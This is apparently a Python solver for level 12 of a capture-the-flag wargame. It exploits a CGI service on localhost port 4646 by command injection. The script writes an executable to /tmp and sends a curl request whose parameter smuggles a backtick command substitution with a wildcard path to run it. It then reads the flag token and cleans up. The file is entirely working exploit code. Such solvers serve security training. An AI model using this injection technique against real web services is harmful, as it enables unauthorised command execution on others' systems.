"""LEVEL 12"""

from time import sleep

import utils as u
from utils.level_wrapper import level_handler


@level_handler
def solve_level12(_, snow_crash):
    """Inject command via CGI parameters"""

    snow_crash[
        "echo 'getflag > /tmp/token12' > /tmp/GETFLAG; \
        chmod +x /tmp/GETFLAG; \
        curl 127.0.0.1:4646?x='`/*/GETFLAG`'"
    ]
    sleep(1)
    output = snow_crash["cat /tmp/token12; rm -f /tmp/token12 /tmp/GETFLAG"]
    return "token", u.misc.parse_token(output)
